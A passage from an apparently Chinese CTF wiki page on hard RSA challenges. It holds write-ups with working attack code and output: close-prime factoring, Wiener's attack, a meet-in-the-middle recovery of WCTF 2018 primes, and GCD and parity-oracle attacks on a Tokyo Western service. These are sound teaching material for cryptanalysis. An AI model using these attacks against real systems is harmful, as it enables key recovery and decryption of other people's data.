\u5f97\u5230\u89e3\u538b\u5bc6\u7801\u3002\u7ee7\u7eed\uff0c\u67e5\u770b level1 \u4e2d\u7684\u516c\u94a5 \u279c level1 git: ( master ) \u2717 openssl rsa -pubin -in public.key -text -modulus Public-Key: ( 2048 bit ) Modulus: 00 :c3:26:59:69:e1:ed:74:d2:e0:b4:9a:d5:6a:7c: 2f:2a:9e:c3:71:ff:13:4b:10:37:c0:6f:56:19:34: c5:cb:1f:6d:c0:e3:57:3b:47:c4:76:3e:21:a3:b0: 11 :11:78:d4:ee:4f:e8:99:2b:15:cb:cb:d7:73:e4: f9:a6:28:20:fd:db:8c:ea:16:ed:67:c2:48:12:6e: 4b:01:53:4a:67:cb:22:23:3b:34:2e:af:13:ef:93: 45 :16:2b:00:9f:e0:4b:d1:90:c9:2c:27:9a:34:c3: 3f:d7:ee:40:f5:82:50:39:aa:8c:e9:c2:7b:f4:36: e3:38:9d:04:50:db:a9:b7:3f:4b:2a:d6:8a:2a:5c: 87 :2a:eb:74:35:98:6a:9c:e4:52:cb:93:78:d2:da: 39 :83:f3:0c:d1:65:1e:66:9c:40:56:06:0d:58:fc: 41 :64:5e:06:da:83:d0:3b:06:42:70:da:38:53:e0: 54 :35:53:ce:de:79:4a:bf:f5:3b:e5:53:7f:6c:18: 12 :67:a9:de:37:7d:44:65:5e:68:0a:78:39:3d:bb: 00 :22:35:0e:a3:94:e6:94:15:1a:3d:39:c7:50:0e: b1:64:a5:29:a3:69:41:40:69:94:b0:0d:1a:ea:9a: 12 :27:50:ee:1e:3a:19:b7:29:70:b4:6d:1e:9d:61: 3e:7d Exponent: 65537 ( 0x10001 ) Modulus = C3265969E1ED74D2E0B49AD56A7C2F2A9EC371FF134B1037C06F561934C5CB1F6DC0E3573B47C4763E21A3B0111178D4EE4FE8992B15CBCBD773E4F9A62820FDDB8CEA16ED67C248126E4B01534A67CB22233B342EAF13EF9345162B009FE04BD190C92C279A34C33FD7EE40F5825039AA8CE9C27BF436E3389D0450DBA9B73F4B2AD68A2A5C872AEB7435986A9CE452CB9378D2DA3983F30CD1651E669C4056060D58FC41645E06DA83D03B064270DA3853E0543553CEDE794ABFF53BE5537F6C181267A9DE377D44655E680A78393DBB0022350EA394E694151A3D39C7500EB164A529A36941406994B00D1AEA9A122750EE1E3A19B72970B46D1E9D613E7D writing RSA key -----BEGIN PUBLIC KEY----- MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwyZZaeHtdNLgtJrVanwv Kp7Dcf8TSxA3wG9WGTTFyx9twONXO0fEdj4ho7AREXjU7k/omSsVy8vXc+T5pigg /duM6hbtZ8JIEm5LAVNKZ8siIzs0Lq8T75NFFisAn+BL0ZDJLCeaNMM/1+5A9YJQ OaqM6cJ79DbjOJ0EUNuptz9LKtaKKlyHKut0NZhqnORSy5N40to5g/MM0WUeZpxA VgYNWPxBZF4G2oPQOwZCcNo4U+BUNVPO3nlKv/U75VN/bBgSZ6neN31EZV5oCng5 PbsAIjUOo5TmlBUaPTnHUA6xZKUpo2lBQGmUsA0a6poSJ1DuHjoZtylwtG0enWE+ fQIDAQAB -----END PUBLIC KEY----- \u4f3c\u4e4e\u8fd8\u662f\u4e0d\u662f\u5f88\u5927\uff0c\u518d\u6b21\u5206\u89e3\uff0c\u7136\u540e\u8bd5\u4e86 factordb \u4e0d\u884c\uff0c\u8bd5\u8bd5 yafu\u3002\u7ed3\u679c\u5206\u89e3\u51fa\u6765\u4e86\u3002 P309 = 156956618844706820397012891168512561016172926274406409351605204875848894134762425857160007206769208250966468865321072899370821460169563046304363342283383730448855887559714662438206600780443071125634394511976108979417302078289773847706397371335621757603520669919857006339473738564640521800108990424511408496383 P309 = 156956618844706820397012891168512561016172926274406409351605204875848894134762425857160007206769208250966468865321072899370821460169563046304363342283383730448855887559714662438206600780443071125634394511976108979417302078289773847706397371335621757603520669919857006339473738564640521800108990424511408496259 \u53ef\u4ee5\u53d1\u73b0\u8fd9\u4e24\u4e2a\u6570\u975e\u5e38\u76f8\u8fd1\uff0c\u53ef\u80fd\u662f factordb \u6ca1\u6709\u5b9e\u73b0\u8fd9\u7c7b\u5206\u89e3\u3002 \u7ee7\u800c\u4e0b\u9762\u7684\u64cd\u4f5c\u7c7b\u4f3c\u4e8e level0\u3002\u53ea\u662f\u8fd9\u6b21\u662f\u76f4\u63a5\u89e3\u5bc6\u5c31\u597d\uff0c\u6ca1\u5565\u586b\u5145\uff0c\u8bd5\u4e86\u586b\u5145\u53cd\u800c\u9519 \u5f97\u5230\u5bc6\u7801 fA35ORI11TLoN_Att1Ck_cL0sE_PrI8e_4acTorS \u3002\u7ee7\u7eed\u4e0b\u4e00\u6b65\uff0c\u67e5\u770b\u516c\u94a5 \u279c level2 git: ( master ) \u2717 openssl rsa -pubin -in public.key -text -modulus Public-Key: ( 1025 bit ) Modulus: 01 :ba:0c:c2:45:b4:5c:e5:b5:f5:6c:d5:ca:a5:90: c2:8d:12:3d:8a:6d:7f:b6:47:37:fb:7c:1f:5a:85: 8c:1e:35:13:8b:57:b2:21:4f:f4:b2:42:24:5f:33: f7:2c:2c:0d:21:c2:4a:d4:c5:f5:09:94:c2:39:9d: 73 :e5:04:a2:66:1d:9c:4b:99:d5:38:44:ab:13:d9: cd:12:a4:d0:16:79:f0:ac:75:f9:a4:ea:a8:7c:32: 16 :9a:17:d7:7d:80:fd:60:29:64:c7:ea:50:30:63: 76 :59:c7:36:5e:98:d2:ea:5b:b3:3a:47:17:08:2d: d5:24:7d:4f:a7:a1:f0:d5:73 Exponent: 01 :00:8e:81:dd:a0:e3:19:28:e8:ee:51:11:08:c7: 50 :5f:61:31:05:d2:e2:ff:9b:83:71:e4:29:c2:dd: 92 :70:65:d4:09:6d:58:c3:76:31:07:f1:d4:fc:cf: 2d:b3:0a:6d:02:7c:56:61:7c:be:7e:0b:7e:d9:22: 28 :66:9e:fb:3d:2f:2c:20:59:3c:21:ef:ff:31:00: 6a:fb:a7:68:de:4a:0a:4c:1a:a7:09:d5:48:98:c8: 1f:cf:fb:dd:f7:9c:ae:ae:0b:15:f4:b2:c7:e0:bc: ba:31:4f:5e:07:83:ad:0e:7f:b9:82:a4:d2:01:fa: 68 :29:6d:66:7c:cf:57:b9:4b Modulus = 1BA0CC245B45CE5B5F56CD5CAA590C28D123D8A6D7FB64737FB7C1F5A858C1E35138B57B2214FF4B242245F33F72C2C0D21C24AD4C5F50994C2399D73E504A2661D9C4B99D53844AB13D9CD12A4D01679F0AC75F9A4EAA87C32169A17D77D80FD602964C7EA5030637659C7365E98D2EA5BB33A4717082DD5247D4FA7A1F0D573 writing RSA key -----BEGIN PUBLIC KEY----- MIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKBgQG6DMJFtFzltfVs1cqlkMKN Ej2KbX+2Rzf7fB9ahYweNROLV7IhT/SyQiRfM/csLA0hwkrUxfUJlMI5nXPlBKJm HZxLmdU4RKsT2c0SpNAWefCsdfmk6qh8MhaaF9d9gP1gKWTH6lAwY3ZZxzZemNLq W7M6RxcILdUkfU+nofDVcwKBgQEAjoHdoOMZKOjuUREIx1BfYTEF0uL/m4Nx5CnC 3ZJwZdQJbVjDdjEH8dT8zy2zCm0CfFZhfL5+C37ZIihmnvs9LywgWTwh7/8xAGr7 p2jeSgpMGqcJ1UiYyB/P+933nK6uCxX0ssfgvLoxT14Hg60Of7mCpNIB+mgpbWZ8 z1e5Sw == -----END PUBLIC KEY----- \u53d1\u73b0\u79c1\u94a5 e \u548c n \u51e0\u4e4e\u4e00\u6837\u5927\uff0c\u8003\u8651 d \u6bd4\u8f83\u5c0f\uff0c\u4f7f\u7528 Wiener's Attack\u3002\u5f97\u5230 d\uff0c\u5f53\u7136\u4e5f\u53ef\u4ee5\u518d\u6b21\u9a8c\u8bc1\u4e00\u904d\u3002 \u279c level2 git: ( master ) \u2717 python RSAwienerHacker.py Testing Wiener Attack Hacked! ( 'hacked_d = ' , 29897859398360008828023114464512538800655735360280670512160838259524245332403L ) ------------------------- Hacked! ( 'hacked_d = ' , 29897859398360008828023114464512538800655735360280670512160838259524245332403L ) ------------------------- Hacked! ( 'hacked_d = ' , 29897859398360008828023114464512538800655735360280670512160838259524245332403L ) ------------------------- Hacked! ( 'hacked_d = ' , 29897859398360008828023114464512538800655735360280670512160838259524245332403L ) ------------------------- Hacked! ( 'hacked_d = ' , 29897859398360008828023114464512538800655735360280670512160838259524245332403L ) ------------------------- \u8fd9\u65f6\u6211\u4eec\u89e3\u5bc6\u5bc6\u6587\uff0c\u89e3\u5bc6\u4ee3\u7801\u5982\u4e0b from Crypto.PublicKey import RSA from Crypto.Cipher import PKCS1_v1_5 , PKCS1_OAEP import gmpy2 from base64 import b64decode d = 29897859398360008828023114464512538800655735360280670512160838259524245332403 L with open ( './public.key' ) as f : key = RSA . importKey ( f ) n = key . n e = key . e def getprivatekey ( n , e , d ): priviatekey = RSA . construct (( long ( n ), long ( e ), long ( d ))) with open ( 'private.pem' , 'w' ) as f : f . write ( priviatekey . exportKey ()) def decrypt (): with open ( './level3.passwd.enc' ) as f : cipher = f . read () with open ( './private.pem' ) as f : key = RSA . importKey ( f ) print key . decrypt ( cipher ) getprivatekey ( n , e , d ) decrypt () \u5229\u7528\u672b\u5c3e\u7684\u5b57\u7b26\u4e32 wIe6ER1s_1TtA3k_e_t00_larg3 \u89e3\u5bc6\u538b\u7f29\u5305\uff0c\u6ce8\u610f\u53bb\u6389 B\u3002\u81f3\u6b64\u5168\u90e8\u89e3\u5bc6\u7ed3\u675f\uff0c\u5f97\u5230 flag\u3002 2018 WCTF RSA \u00b6 \u9898\u76ee\u57fa\u672c\u63cf\u8ff0\u4e3a Description: Encrypted message for user \"admin\": <<<320881698662242726122152659576060496538921409976895582875089953705144841691963343665651276480485795667557825130432466455684921314043200553005547236066163215094843668681362420498455007509549517213285453773102481574390864574950259479765662844102553652977000035769295606566722752949297781646289262341623549414376262470908749643200171565760656987980763971637167709961003784180963669498213369651680678149962512216448400681654410536708661206594836597126012192813519797526082082969616915806299114666037943718435644796668877715954887614703727461595073689441920573791980162741306838415524808171520369350830683150672985523901>>> admin public key: n = 483901264006946269405283937218262944021205510033824140430120406965422208942781742610300462772237450489835092525764447026827915305166372385721345243437217652055280011968958645513779764522873874876168998429546523181404652757474147967518856439439314619402447703345139460317764743055227009595477949315591334102623664616616842043021518775210997349987012692811620258928276654394316710846752732008480088149395145019159397592415637014390713798032125010969597335893399022114906679996982147566245244212524824346645297637425927685406944205604775116409108280942928854694743108774892001745535921521172975113294131711065606768927 e = 65537 Service: http://36.110.234.253 \u8fd9\u4e2a\u9898\u76ee\u73b0\u5728\u5df2\u7ecf\u6ca1\u6709\u529e\u6cd5\u5728\u7ebf\u83b7\u53d6 binary \u4e86\uff0c\u73b0\u5728\u5f97\u5230\u7684 binary \u662f\u4e4b\u524d\u5df2\u7ecf\u4e0b\u8f7d\u597d\u7684\uff0c\u6211\u4eec\u5f53\u65f6\u9700\u8981\u767b\u5f55\u7528\u6237\u7684 admin \u6765\u4e0b\u8f7d\u5bf9\u5e94\u7684 generator\u3002 \u901a\u8fc7\u7b80\u5355\u9006\u5411\u8fd9\u4e2a generator\uff0c\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\u8fd9\u4e2a\u7a0b\u5e8f\u662f\u8fd9\u4e48\u5de5\u4f5c\u7684 \u5229\u7528\u7528\u6237\u7ed9\u5b9a\u7684 license\uff0832 \u4e2a\u5b57\u8282\uff09\uff0c\u8fed\u4ee3\u89e3\u5bc6\u67d0\u4e2a \u56fa\u5b9a\u4f4d\u7f6e \u4e4b\u540e\u7684\u6570\u636e\uff0c\u6bcf 32 \u4e2a\u5b57\u8282\u4e00\u7ec4\uff0c\u4e0e\u5bc6\u94a5\u76f8\u5f02\u6216\u5f97\u5230\u7ed3\u679c\u3002 \u5bc6\u94a5\u7684\u751f\u6210\u65b9\u6cd5\u4e3a k_1=key k_1=key k_2 =sha256(k_1) k_2 =sha256(k_1) ... k_n=sha256(k_{n-1}) k_n=sha256(k_{n-1}) \u5176\u4e2d\uff0c\u56fa\u5b9a\u4f4d\u7f6e\u5c31\u662f\u5728\u627e\u6e90\u6587\u4ef6 generator \u4e2d\u7b2c\u4e8c\u6b21\u51fa\u73b0 ENCRYPTED \u7684\u4f4d\u7f6e\uff0c\u7136\u540e\u518d\u6b21\u504f\u79fb 32 \u4e2a\u5b57\u8282\u3002 _ENCRYPT_STR = ENCRYPTED_STR ; v10 = 0 ; ENCRYPTED_LEN = strlen ( ENCRYPTED_STR ); do { do ++ v9 ; while ( strncmp ( & file_contents [ v9 ], _ENCRYPT_STR , ENCRYPTED_LEN ) ); ++ v10 ; } while ( v10 <= 1 ); v11 = & file_start_off_32 [ loc2 + ENCRYPTED_LEN ]; v12 = loc2 + ENCRYPTED_LEN ; len = file_size - ( loc2 + ENCRYPTED_LEN ) - 32 ; decrypt ( & file_start_off_32 [ v12 ], & license , len ); sha256_file_start ( v11 , len , & output ); if ( ! memcmp ( & output , & file_contents [ v12 ], 0x20 u ) ) { v14 = fopen ( \"out.exe\" , \"wb\" ); fwrite ( v11 , 1 u , len , v14 ); fclose ( v14 ); sprintf ( byte_406020 , \"out.exe %s \" , argv [ 1 ]); system ( byte_406020 ); } \u540c\u65f6\uff0c\u6211\u4eec\u9700\u8981\u786e\u4fdd\u751f\u6210\u7684\u6587\u4ef6\u7684\u6821\u9a8c\u5bf9\u5e94\u7684\u54c8\u5e0c\u503c\u6070\u597d\u4e3a\u6307\u5b9a\u7684\u503c\uff0c\u7531\u4e8e\u6587\u4ef6\u6700\u540e\u662f\u4e00\u4e2a exe \u6587\u4ef6\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u8ba4\u4e3a\u6700\u540e\u7684\u6587\u4ef6\u5934\u5c31\u662f\u6807\u51c6\u7684 exe \u6587\u4ef6\uff0c\u56e0\u6b64\u5c31\u4e0d\u9700\u8981\u77e5\u9053\u539f\u59cb\u7684 license \u6587\u4ef6\uff0c\u8fdb\u800c\u6211\u4eec\u53ef\u4ee5\u7f16\u5199 python \u811a\u672c\u751f\u6210 exe\u3002 \u5728\u751f\u6210\u7684 exe \u4e2d\uff0c\u6211\u4eec\u5206\u6790\u51fa\u7a0b\u5e8f\u7684\u57fa\u672c\u6d41\u7a0b\u4e3a \u8bfb\u53d6 license \u4f7f\u7528 license \u4f5c\u4e3a seed \u5206\u522b\u751f\u6210 pq \u5229\u7528 p\uff0cq \u751f\u6210 n\uff0ce\uff0cd\u3002 \u5176\u6f0f\u6d1e\u51fa\u73b0\u5728\u751f\u6210 p\uff0cq \u7684\u65b9\u6cd5\u4e0a\uff0c\u800c\u4e14\u751f\u6210 p \u548c q \u7684\u65b9\u6cd5\u7c7b\u4f3c\u3002 \u6211\u4eec\u5982\u679c\u4ed4\u7ec6\u5206\u6790\u4e0b\u751f\u6210\u7d20\u6570\u7684\u51fd\u6570\u7684\u8bdd\uff0c\u53ef\u4ee5\u770b\u5230\u6bcf\u4e2a\u7d20\u6570\u90fd\u662f\u5206\u4e3a\u4e24\u90e8\u5206\u751f\u6210\u7684 \u751f\u6210\u5de6\u534a\u90e8\u5206 512 \u4f4d\u3002 \u751f\u6210\u53f3\u534a\u90e8\u5206 512 \u4f4d\u3002 \u5de6\u53f3\u6784\u6210 1024 \u6bd4\u7279\u4f4d\uff0c\u5224\u65ad\u662f\u4e0d\u662f\u7d20\u6570\uff0c\u662f\u7d20\u6570\u5c31\u6210\u529f\uff0c\u4e0d\u662f\u7d20\u6570\uff0c\u7ee7\u7eed\u751f\u6210\u3002 \u5176\u4e2d\u751f\u6210\u6bcf\u90e8\u5206\u7684\u65b9\u5f0f\u76f8\u540c\uff0c\u65b9\u5f0f\u4e3a sha512 ( const1 | const2 | const3 | const4 | const5 | const6 | const7 | const8 | v9 ) v9 = r % 1000000007 \u53ea\u6709 v9 \u4f1a\u6709\u6240\u53d8\u5316\uff0c\u4f46\u662f\u5b83\u7684\u8303\u56f4\u5374\u662f\u56fa\u5b9a\u7684\u3002 \u90a3\u4e48\uff0c\u5982\u679c\u6211\u4eec\u8868\u793a p\uff0cq \u4e3a p=a*2^{512}+b p=a*2^{512}+b q=c*2^{512}+d q=c*2^{512}+d \u90a3\u4e48 n=pq=ac*2^{1024}+(ad+bc)*2^{512}+bd n=pq=ac*2^{1024}+(ad+bc)*2^{512}+bd \u90a3\u4e48 n \\equiv bd \\bmod 2^{512} n \\equiv bd \\bmod 2^{512} \u800c\u4e14\u7531\u4e8e p \u548c q \u5728\u751f\u6210\u65f6\uff0ca\uff0cb\uff0cc\uff0cd \u5747\u53ea\u6709 1000000007 \u79cd\u53ef\u80fd\u6027\u3002 \u8fdb\u800c\uff0c\u6211\u4eec\u53ef\u4ee5\u679a\u4e3e\u6240\u6709\u7684\u53ef\u80fd\u6027\uff0c\u9996\u5148\u8ba1\u7b97\u51fa b \u53ef\u80fd\u7684\u96c6\u5408\u4e3a S\uff0c\u540c\u65f6\u6211\u4eec\u4f7f\u7528\u4e2d\u95f4\u76f8\u9047\u653b\u51fb\uff0c\u8ba1\u7b97 n/d \\equiv b \\bmod 2^{512} n/d \\equiv b \\bmod 2^{512} \u8fd9\u91cc\u7531\u4e8e b \u548c d \u90fd\u662f p \u7684\u5c3e\u6570\uff0c\u6240\u4ee5\u4e00\u5b9a\u4e0d\u4f1a\u662f 2 \u7684\u500d\u6570\uff0c\u8fdb\u800c\u5fc5\u7136\u5b58\u5728\u9006\u5143\u3002 \u8fd9\u6837\u505a\u867d\u7136\u53ef\u4ee5\uff0c\u7136\u800c\uff0c\u6211\u4eec\u53ef\u4ee5\u7b80\u5355\u7b97\u4e00\u4e0b\u5b58\u50a8\u7a7a\u95f4 64*1000000007 / 1024 / 1024 / 1024=59 64*1000000007 / 1024 / 1024 / 1024=59 \u4e5f\u5c31\u662f\u8bf4\u9700\u8981 59 G\uff0c\u592a\u5927\u4e86\uff0c\uff0c\u6240\u4ee5\u6211\u4eec\u4ecd\u7136\u9700\u8981\u8fdb\u4e00\u6b65\u8003\u8651 n \\equiv bd \\bmod 2^{64} n \\equiv bd \\bmod 2^{64} \u8fd9\u6837\uff0c\u6211\u4eec\u7684\u5185\u5b58\u9700\u6c42\u77ac\u95f4\u5c31\u964d\u5230\u4e86 8 G\u5de6\u53f3\u3002\u6211\u4eec\u4ecd\u7136\u4f7f\u7528\u679a\u4e3e\u7684\u65b9\u6cd5\u8fdb\u884c\u8fd0\u7b97\u3002 \u5176\u6b21\uff0c\u6211\u4eec\u4e0d\u80fd\u4f7f\u7528 python\uff0c\uff0cpython \u5360\u636e\u7a7a\u95f4\u592a\u5927\uff0c\u56e0\u6b64\u9700\u8981\u4f7f\u7528 c/c++ \u7f16\u5199\u3002 \u679a\u4e3e\u6240\u6709\u53ef\u80fd\u7684 d \u8ba1\u7b97\u5bf9\u5e94\u7684\u503c n/d n/d \u5982\u679c\u5bf9\u5e94\u7684\u503c\u5728\u96c6\u5408 S \u4e2d\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u8ba4\u4e3a\u627e\u5230\u4e86\u4e00\u5bf9\u5408\u6cd5\u7684 b \u548c d\uff0c\u56e0\u6b64\u6211\u4eec\u5c31\u53ef\u4ee5\u6062\u590d p \u548c q \u7684\u4e00\u534a\u3002 \u4e4b\u540e\uff0c\u6211\u4eec\u6839\u636e n-bd=ac*2^{1024}+(ad+bc)*2^{512} n-bd=ac*2^{1024}+(ad+bc)*2^{512} \u53ef\u4ee5\u5f97\u5230 \\frac{n-bd}{2^{512}} = ac*2^{512}+ad+bc \\frac{n-bd}{2^{512}} = ac*2^{512}+ad+bc \\frac{n-bd}{2^{512}} \\equiv ad+bc \\bmod 2^{512} \\frac{n-bd}{2^{512}} \\equiv ad+bc \\bmod 2^{512} \u7c7b\u4f3c\u5730\uff0c\u6211\u4eec\u53ef\u4ee5\u8ba1\u7b97\u51fa a \u548c c\uff0c\u4ece\u800c\u6211\u4eec\u5c31\u53ef\u4ee5\u5b8c\u5168\u6062\u590d\u51fa p \u548c q\u3002 \u5728\u5177\u4f53\u6c42\u89e3\u7684\u8fc7\u7a0b\u4e2d\uff0c\u5728\u6c42 p \u548c q \u7684\u4e00\u90e8\u5206\u65f6\uff0c\u53ef\u4ee5\u53d1\u73b0\u56e0\u4e3a\u662f\u6a21 2^{64} 2^{64} \uff0c\u6240\u4ee5\u53ef\u80fd\u5b58\u5728\u78b0\u649e\uff08\u4f46\u5176\u5b9e\u5c31\u662f\u4e00\u4e2a\u662f p\uff0c\u53e6\u5916\u4e00\u4e2a\u662fq\uff0c\u6070\u597d\u5bf9\u79f0\u3002\uff09\u3002\u4e0b\u9762\u6211\u4eec\u5c31\u6c42\u5f97\u4e86 b \u5bf9\u5e94\u7684 v9\u3002 \u6ce8\u610f\uff1a\u8fd9\u91cc\u679a\u4e3e\u51fa\u6765\u7684\u7a7a\u95f4\u5927\u7ea6\u5360\u7528 11 \u4e2a G\uff08\u5305\u62ec\u7d22\u5f15\uff09\uff0c\u6240\u4ee5\u8bf7\u9009\u62e9\u5408\u9002\u7684\u4f4d\u7f6e\u3002 b64: 9646799660ae61bd idx_b: 683101175 idx_d: 380087137 search 23000000 search 32000000 search 2b000000 search d000000 search 3a000000 search 1c000000 search 6000000 search 24000000 search 15000000 search 33000000 search 2c000000 search e000000 b64: 9c63259ccab14e0b idx_b: 380087137 idx_d: 683101175 search 1d000000 search 3b000000 search 7000000 search 16000000 search 25000000 search 34000000 \u5176\u5b9e\uff0c\u6211\u4eec\u5728\u771f\u6b63\u5f97\u5230 p \u6216\u8005 q \u7684\u4e00\u90e8\u5206\u540e\uff0c\u53e6\u5916\u4e00\u90e8\u5206\u5b8c\u5168\u53ef\u4ee5\u4f7f\u7528\u66b4\u529b\u679a\u4e3e\u7684\u65b9\u5f0f\u83b7\u53d6\uff0c\u56e0\u4e3a\u8ba1\u7b97\u91cf\u51e0\u4e4e\u90fd\u662f\u4e00\u6837\u7684\uff0c\u6700\u540e\u7ed3\u679c\u4e3a ... hash 7000000 hash 30000000 p = 13941980378318401138358022650359689981503197475898780162570451627011086685747898792021456273309867273596062609692135266568225130792940286468658349600244497842007796641075219414527752166184775338649475717002974228067471300475039847366710107240340943353277059789603253261584927112814333110145596444757506023869 q = 34708215825599344705664824520726905882404144201254119866196373178307364907059866991771344831208091628520160602680905288551154065449544826571548266737597974653701384486239432802606526550681745553825993460110874794829496264513592474794632852329487009767217491691507153684439085094523697171206345793871065206283 plain text 13040004482825754828623640066604760502140535607603761856185408344834209443955563791062741885 hash 16000000 hash 25000000 hash b000000 hash 34000000 hash 1 a000000 ... \u279c 2018 - WCTF - rsa git :( master ) \u2717 python Python 2.7.14 ( default , Mar 22 2018 , 14 : 43 : 05 ) [ GCC 4.2.1 Compatible Apple LLVM 9.0.0 ( clang - 900.0.39.2 )] on darwin Type \"help\" , \"copyright\" , \"credits\" or \"license\" for more information . >>> p = 13040004482825754828623640066604760502140535607603761856185408344834209443955563791062741885 >>> hex ( p )[ 2 :] . decode ( 'hex' ) Traceback ( most recent call last ): File \"<stdin>\" , line 1 , in < module > File \"/usr/local/Cellar/python@2/2.7.14_3/Frameworks/Python.framework/Versions/2.7/lib/python2.7/encodings/hex_codec.py\" , line 42 , in hex_decode output = binascii . a2b_hex ( input ) TypeError : Odd - length string >>> hex ( p )[ 2 : - 1 ] . decode ( 'hex' ) 'flag {fa6778724ed740396fc001b198f30313} ' \u6700\u540e\u6211\u4eec\u4fbf\u62ff\u5230 flag \u4e86\u3002 \u8be6\u7ec6\u7684\u5229\u7528\u4ee3\u7801\u8bf7\u53c2\u89c1 ctf-challenge \u4ed3\u5e93\u3002 \u76f8\u5173\u7f16\u8bd1\u6307\u4ee4\uff0c\u9700\u8981\u94fe\u63a5\u76f8\u5173\u7684\u5e93\u3002 g++ exp2.cpp -std = c++11 -o main2 -lgmp -lcrypto -pthread \u53c2\u8003 \u00b6 https://upbhack.de/posts/wctf-2018-writeup-rsa/","title":"RSA \u590d\u6742\u9898\u76ee"},{"location":"crypto/asymmetric/rsa/rsa_complex/#rsa","text":"","title":"RSA \u590d\u6742\u9898\u76ee"},{"location":"crypto/asymmetric/rsa/rsa_complex/#2018-tokyo-western-mixed-cipher","text":"\u9898\u76ee\u7ed9\u7684\u4fe1\u606f\u5982\u4e0b\u6240\u793a\uff1a \u6bcf\u6b21\u4ea4\u4e92\u53ef\u4ee5\u7ef4\u6301\u7684\u65f6\u95f4\u957f\u5ea6\u7ea6\u4e3a 5 \u5206\u949f \u6bcf\u6b21\u4ea4\u4e92\u4e2d\u4e2dn\u662f\u786e\u5b9a\u7684 1024 bit\uff0c\u4f46\u662f\u672a\u77e5\uff0c e \u4e3a 65537 \u4f7f\u7528 aes \u52a0\u5bc6\u4e86 flag\uff0c\u5bc6\u94a5\u548c IV \u5747\u4e0d\u77e5\u9053 \u6bcf\u6b21\u5bc6\u94a5\u662f\u56fa\u5b9a\u7684\uff0c\u4f46\u662f IV \u6bcf\u6b21\u90fd\u4f1a\u968f\u673a \u53ef\u4ee5\u4f7f\u7528 encrypt \u529f\u80fd\u968f\u610f\u4f7f\u7528 rsa \u548c aes \u8fdb\u884c\u52a0\u5bc6\uff0c\u5176\u4e2d\u6bcf\u6b21\u52a0\u5bc6\u90fd\u4f1a\u5bf9 aes \u7684 iv \u8fdb\u884c\u968f\u673a \u53ef\u4ee5\u4f7f\u7528 decrypt \u5bf9\u968f\u610f\u7684\u5bc6\u6587\u8fdb\u884c\u89e3\u5bc6\uff0c\u4f46\u662f\u53ea\u80fd\u77e5\u9053\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u662f\u4ec0\u4e48 \u53ef\u4ee5\u4f7f\u7528 print_flag \u83b7\u53d6 flag \u5bc6\u6587 \u53ef\u4ee5\u4f7f\u7528 print_key \u83b7\u53d6 rsa \u52a0\u5bc6\u7684 aes \u5bc6\u94a5 \u672c\u9898\u76ee\u770b\u4f3c\u4e00\u4e2a\u9898\u76ee\uff0c\u5b9e\u5219\u662f 3 \u4e2a\u9898\u76ee\uff0c\u9700\u8981\u5206\u6b65\u9aa4\u89e3\u51b3\u3002\u5728\u6b64\u4e4b\u524d\uff0c\u6211\u5011\u6e96\u5099\u597d\u4ea4\u4e92\u7684\u51fd\u6578 def get_enc_key ( io ): io . read_until ( \"4: get encrypted keyn\" ) io . writeline ( \"4\" ) io . read_until ( \"here is encrypted key :)n\" ) c = int ( io . readline ()[: - 1 ], 16 ) return c def encrypt_io ( io , p ): io . read_until ( \"4: get encrypted keyn\" ) io . writeline ( \"1\" ) io . read_until ( \"input plain text: \" ) io . writeline ( p ) io . read_until ( \"RSA: \" ) rsa_c = int ( io . readline ()[: - 1 ], 16 ) io . read_until ( \"AES: \" ) aes_c = io . readline ()[: - 1 ] . decode ( \"hex\" ) return rsa_c , aes_c def decrypt_io ( io , c ): io . read_until ( \"4: get encrypted keyn\" ) io . writeline ( \"2\" ) io . read_until ( \"input hexencoded cipher text: \" ) io . writeline ( long_to_bytes ( c ) . encode ( \"hex\" )) io . read_until ( \"RSA: \" ) return io . read_line ()[: - 1 ] . decode ( \"hex\" )","title":"2018 Tokyo Western Mixed Cipher"},{"location":"crypto/asymmetric/rsa/rsa_complex/#gcd-attack-n","text":"\u7b2c\u4e00\u6b65\u6211\u4eec\u9700\u8981\u628a\u6ca1\u6709\u7ed9\u51fa\u7684 n \u7b97\u51fa\u6765\uff0c\u56e0\u4e3a\u6211\u4eec\u53ef\u4ee5\u5229\u7528 encrypt \u529f\u80fd\u5bf9\u6211\u4eec\u8f93\u5165\u7684\u660e\u6587 x \u8fdb\u884c rsa \u52a0\u5bc6\uff0c\u90a3\u4e48\u53ef\u4ee5\u5229\u7528\u6574\u9664\u7684\u6027\u8d28\u7b97 n \u56e0\u4e3ax ^ e = c mod n \u6240\u4ee5 n | x ^ e - c \u6211\u4eec\u53ef\u4ee5\u6784\u9020\u8db3\u591f\u591a\u7684 x\uff0c\u7b97\u51fa\u6700\u591f\u591a\u7684 x ^ e - c\uff0c\u4ece\u800c\u8ba1\u7b97\u6700\u5927\u516c\u7ea6\u6570\uff0c\u5f97\u5230 n\u3002 def get_n(io): rsa_c,aes_c=encrypt_io(io,long_to_bytes(2)) n=pow(2,65537)-rsa_c for i in range(3,6): rsa_c, aes_c = encrypt_io(io, long_to_bytes(i)) n=primefac.gcd(n,pow(i,65537)-rsa_c) return n \u53ef\u4ee5\u5229\u7528\u52a0\u5bc6\u8fdb\u884c check def check_n ( io , n ): rsa_c , aes_c = encrypt_io ( io , \"123\" ) if pow ( bytes_to_long ( \"123\" ), e , n ) == rsa_c : return True else : return False","title":"GCD attack n"},{"location":"crypto/asymmetric/rsa/rsa_complex/#rsa-parity-oracle","text":"\u5229\u7528 leak \u7684\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\uff0c\u6211\u4eec\u53ef\u4ee5\u8fdb\u884c\u9009\u62e9\u5bc6\u6587\u653b\u51fb\uff0c\u4f7f\u7528 RSA parity oracle \u56de\u590d aes \u7684\u79d8\u94a5 def guess_m ( io , n , c ): k = 1 lb = 0 ub = n while ub != lb : print lb , ub tmp = c * gmpy2 . powmod ( 2 , k * e , n ) % n if ord ( decrypt_io ( io , tmp )[ - 1 ]) % 2 == 1 : lb = ( lb + ub ) / 2 else : ub = ( lb + ub ) / 2 k += 1 print ub , len ( long_to_bytes ( ub )) return ub","title":"RSA parity oracle"},{"location":"crypto/asymmetric/rsa/rsa_complex/#prng-predict","text":"\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u89e3\u5bc6 flag 